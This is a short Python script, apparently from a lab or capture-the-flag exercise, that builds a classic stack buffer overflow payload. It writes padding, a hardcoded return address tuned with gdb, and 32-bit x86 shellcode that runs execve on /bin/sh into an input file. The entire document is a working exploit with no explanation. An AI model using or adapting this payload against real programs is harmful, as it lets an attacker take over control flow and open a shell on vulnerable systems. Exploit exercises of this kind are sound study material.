import struct
code=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
addr = 0xffffcd30 #with gdb
#addr = 0xffffcd40 #without gdb
shellcode = b"A" * 28
shellcode += struct.pack("<L", addr)
fp = open("in.txt", 'wb')
fp.write(shellcode)
fp.write(code)
fp.flush()
